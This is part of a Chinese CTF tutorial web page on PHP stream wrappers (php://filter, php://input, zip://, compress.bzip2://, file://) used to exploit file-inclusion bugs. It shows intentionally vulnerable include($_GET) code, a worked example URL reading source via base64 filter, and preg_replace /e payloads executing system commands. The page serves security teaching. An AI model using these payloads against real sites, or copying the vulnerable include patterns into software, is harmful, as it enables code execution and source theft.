+<h4 id="phpfilter">php://filter<a class="headerlink" href="#phpfilter" title="Permanent link">&para;</a></h4>
+<p>作用：这个可以用来过滤我们发送或接收的数据。 在 CTF 中可以用来读取脚本源代码</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-57-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1"></a>php://filter/read or write=/resource=数据流
+</code></pre></div></td></tr></table></div>
+<ul>
+<li>
+<p>resource=&lt;要过滤的数据流&gt; <strong>（必须）</strong>  它指定了你要筛选过滤的数据流</p>
+</li>
+<li>
+<p>read=&lt;读链的筛选列表&gt;</p>
+</li>
+</ul>
+<p>可选</p>
+<p>。可以设定一个或多个过滤器名称，以管道符<code>|</code>分隔。</p>
+<ul>
+<li>常用的有：</li>
+<li>
+<p>convert.base64</p>
+<ul>
+<li>如果对其编码，则 convert.base64-encode</li>
+<li>对应的解码，则 convert.base64-decode</li>
+</ul>
+</li>
+<li>
+<p>convert.iconv.*</p>
+<ul>
+<li>详见：https://www.php.net/manual/zh/function.iconv.php</li>
+</ul>
+</li>
+<li>
+<p>write=&lt;写链的筛选列表&gt;<strong>可选</strong>。可以设定一个或多个过滤器名称，以管道符<code>|</code>分隔。</p>
+</li>
+</ul>
+<p>举个例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-58-1">1</a></span>
+<span class="normal"><a href="#__codelineno-58-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1"></a>$id = $_GET[&#39;id&#39;];
+<a id="__codelineno-58-2" name="__codelineno-58-2"></a>include($id);
+</code></pre></div></td></tr></table></div>
+<p>在 CTF 中可以用来读取文件内容（不用 base64）</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-59-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1"></a>php://filter/read=resource=files.txt
+</code></pre></div></td></tr></table></div>
+<p>用 Base64</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-60-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1"></a>php://filter/read=convert.base64-encode/resource=files.txt
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/4d9c93-14a676-78805a221a988e79ef3f42d7.png" /></p>
+<p>上方 base64 解码后为 compare.php 文件源码</p>
+<p><strong>例题</strong></p>
+<p><img alt="img" src="../assets/4e95bd-59c8ec-78805a221a988e79ef3f42d7-1024x251.png" /></p>
+<p>进入 index.php 页面后发现存在参数 page，直接包含 index.php 文件</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-61-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1"></a>http://111.200.241.244:57153/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/f1c02d-a38209-78805a221a988e79ef3f42d7-1024x233.png" /></p>
+<p>解码后为源代码</p>
+<p><img alt="img" src="../assets/76bb54-acc055-78805a221a988e79ef3f42d7-1024x513.png" /></p>
+<p>设置 Header 头 <strong>X-Forwarded-For</strong> 将来源设置为 127.0.0.1，发现如果三个参数（pat、rep、sub）都设
+置了会进入一个正则表达式，这里可以利用 preg_replace 的安全问题，详见：<a href="https://xz.aliyun.com/t/2 577">https://xz.aliyun.com/t/2
+577</a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-62-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1"></a>?pat=/1/e&amp;rep=system(&#39;ls&#39;);&amp;sub=1
+</code></pre></div></td></tr></table></div>
+<p>然后搜一下 flag 就可以了</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-63-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1"></a>?pat=/1/e&amp;rep=system(&#39;grep -r cyber .&#39;);&amp;sub=1
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/3c8c40-a1cfed-78805a221a988e79ef3f42d7-1024x398.png" /></p>
+<p>更多妙用可以看一下 P 神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈 php://filter 的妙用</a></p>
+<h4 id="phpinput">php://input<a class="headerlink" href="#phpinput" title="Permanent link">&para;</a></h4>
+<p>是个可以读取请求的原始数据（输入/输出流）。 如果 html 表单编码设置为"<strong>multipart/form-data</strong>"，
+请求是无效的。
+一般在 CTF 中用于执行 php 代码（<strong>POST 发包</strong>）</p>
+<p>注：需在 php 中设置 <strong>allow_url_include = On</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-64-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1"></a>include($_GET[&#39;id&#39;]);
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/be2041-17d239-78805a221a988e79ef3f42d7-1024x374.png" /></p>
+<p>举个例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-65-1">1</a></span>
+<span class="normal"><a href="#__codelineno-65-2">2</a></span>
+<span class="normal"><a href="#__codelineno-65-3">3</a></span>
+<span class="normal"><a href="#__codelineno-65-4">4</a></span>
+<span class="normal"><a href="#__codelineno-65-5">5</a></span>
+<span class="normal"><a href="#__codelineno-65-6">6</a></span>
+<span class="normal"><a href="#__codelineno-65-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1"></a>$id = $_GET[&#39;id&#39;];
+<a id="__codelineno-65-2" name="__codelineno-65-2"></a>// flag in D:\flag.txt
+<a id="__codelineno-65-3" name="__codelineno-65-3"></a>if (substr($id, 0, 6) === &quot;php://&quot; &amp;&amp; isset($id)) {
+<a id="__codelineno-65-4" name="__codelineno-65-4"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-65-5" name="__codelineno-65-5"></a>}else{
+<a id="__codelineno-65-6" name="__codelineno-65-6"></a>    include(implode($id));
+<a id="__codelineno-65-7" name="__codelineno-65-7"></a>}
+</code></pre></div></td></tr></table></div>
+<p>这里我使用 substr 对字符串进行检测，如果包含 php://则回显 Out，substr 可以用数组绕过</p>
+<p><img alt="img" src="../assets/159070-51221f-78805a221a988e79ef3f42d7-1024x449.png" /></p>
+<h4 id="zip-bzip2-zlib">zip:// &amp; bzip2 &amp; zlib://<a class="headerlink" href="#zip-bzip2-zlib" title="Permanent link">&para;</a></h4>
+<p><strong>触发条件：</strong></p>
+<ul>
+<li>allow_url_fopen: off/on</li>
+<li>allow_url_include: off/on</li>
+</ul>
+<p><strong>作用：</strong>
+zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以用来访问压缩文件中的子文件，可以不用指定后缀名，可修改为任意后缀。jpg、png、gif、xxx、etc…</p>
+<p><strong>ZIP 使用：</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-66-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1"></a>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
+</code></pre></div></td></tr></table></div>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-67-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1"></a>?file=zip://E:\web\d-cutevnc\test.jpg%23test.txt
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/10ef92-a5b091-78805a221a988e79ef3f42d7-1024x198.png" /></p>
+<p><strong>compores.bzip2://file.bz2</strong></p>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 上传，任意后缀名</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-68-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1"></a>?file=compress.bzip2://E:\web\d-cutevnc\test2.test
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/38bded-c460fa-78805a221a988e79ef3f42d7-1024x181.png" /></p>
+<h4 id="file">file://<a class="headerlink" href="#file" title="Permanent link">&para;</a></h4>
+<p>利用条件：</p>
+<ul>
+<li>allow_url_fopen: On</li>
+<li>allow_url_include: On</li>
+</ul>
+<p>用于访问本地文件系统，在 CTF 中通常用来 <strong>读取本地文件</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-69-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1"></a>include($_GET[&quot;id&quot;]);
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/d7e3b1-0f40a8-78805a221a988e79ef3f42d7-1024x209.png" /></p>
+<p>注：本文只是作者单纯想要把写PHP的基础内容，但想着说写过的人那么多了，没必要继续赘述，所以直接转载过来了，<a href="https://hello-ctf.com/hc-web/php_basic/">原文链接</a></p>
+<!--
+  Copyright (c) 2016-2023 Martin Donath <martin.donath@squidfunk.com>
+
+  Permission is hereby granted, free of charge, to any person obtaining a copy
+  of this software and associated documentation files (the "Software"), to
+  deal in the Software without restriction, including without limitation the
+  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+  sell copies of the Software, and to permit persons to whom the Software is
+  furnished to do so, subject to the following conditions:
+
+  The above copyright notice and this permission notice shall be included in
+  all copies or substantial portions of the Software.
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
+  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+  IN THE SOFTWARE.
+-->
+
+<!-- Render date of last update -->
+
+
+<!-- Render date of creation -->
+
+
+<!-- ---------------------------------------------------------------------- -->
+
+<!-- Render authors -->
+
+
+<!-- ---------------------------------------------------------------------- -->
+
+<!-- Render committers from GitHub -->
+
+
+<!-- Render committers from GitLab -->
+
+
+<!-- Render committers -->
+
+
+<!-- ---------------------------------------------------------------------- -->
+
+<!-- Determine date of last update -->
+
+  
+
+  <!-- Determine date of creation -->
+  
+
+
+<!-- Source file information -->
+
+<!--
+  Copyright (c) 2016-2023 Martin Donath <martin.donath@squidfunk.com>
+
+  Permission is hereby granted, free of charge, to any person obtaining a copy
+  of this software and associated documentation files (the "Software"), to
+  deal in the Software without restriction, including without limitation the
+  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+  sell copies of the Software, and to permit persons to whom the Software is
+  furnished to do so, subject to the following conditions:
+
+  The above copyright notice and this permission notice shall be included in
+  all copies or substantial portions of the Software.
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
+  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+  IN THE SOFTWARE.
+-->
+
+<!-- Determine feedback configuration -->
+
+
+<!-- Determine whether to show feedback -->
+
+
+<!-- Was this page helpful? -->
+
+
+  <h2 id="__comments">评论</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js"
+          data-repo="Cola-Pig1121/cpwiki"
+          data-repo-id="R_kgDOOwFdqg"
+          data-category="Announcements"
+          data-category-id="sDIC_kwDOOwFdqs4Cqj-M"
+          data-mapping="url"
+          data-strict="0"
+          data-reactions-senabled="1"
+          data-emit-metadata="0"
+          data-input-position="top"
+          data-theme="preferred_color_scheme"
+          data-lang="zh-CN"
+          data-loading="lazy"
+          crossorigin="anonymous"
+          async>
+  </script>
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <!-- Footer -->
+<footer class="md-footer">
+
+  <!-- Link to previous and/or next page -->
+  
+    
+  
+
+  <!-- Further information -->
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2025 - 2025 Cola Pig 
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+   
+    <font color="#B9B9B9">
+      <div class="footer-visit-count" style="display: flex; justify-content: center; align-items: center;">
+    本站访问量：<script async src="//finicounter.eu.org/finicounter.js"></script>
+    <span id="finicount_views"></span>    &nbsp;|&nbsp;
+    <footer>
+      <a href="https://icp.gov.moe/?keyword=20230640" target="_blank">萌ICP备20230640号</a>
+    </footer>
+  </div>
+      </font>
+
+      <style>
+        .footer-visit-count {
+            height: fit-content;
+            min-height: 55px; /* 根据实际情况调整此高度 */
+        }
+        </style>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["announce.dismiss", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "navigation.expand", "navigation.indexes", "content.tabs.link", "content.tooltips", "content.code.copy", "content.code.annotate"], "search": "../../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/gh/Wcowin/Wcowin.github.io@main/docs/javascripts/extra.js"></script>
+      
+        <script src="../../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/gh/Wcowin/Wcowin.github.io@main/docs/javascripts/view.js"></script>
+      
+    
+  </body>
+</html>
